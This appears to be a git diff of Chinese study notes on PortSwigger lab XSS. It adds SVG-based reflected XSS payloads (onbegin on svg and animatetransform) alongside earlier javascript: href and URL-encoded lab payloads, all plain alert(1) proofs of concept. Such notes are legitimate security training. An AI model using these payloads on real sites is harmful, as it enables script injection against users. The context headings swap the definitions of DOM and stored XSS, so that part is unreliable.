@@ -144,6 +144,13 @@ location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+o
 <svg><a><animate attributeName="href" values=javascript:alert(1)></animate><text></text></a></svg>
 https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
 ```
+###### 允许使用一些 SVG 标记的反射型 XSS
+`通过BP intruder 找到可以用的onbegin事件和svg、animatetransform两个标签`
+```
+<svg onbegin=alert(1)>
+<svg><animatetransform onbegin=alert(1)></svg>
+```
+##### （2）HTML 标签属性中的 XSS
 
 ### (2) DOM型XSS -- 恶意脚本来自网站的数据库
 ### (3) 存储型XSS -- 漏洞存在于客户端代码中，而不是服务器端代码中。
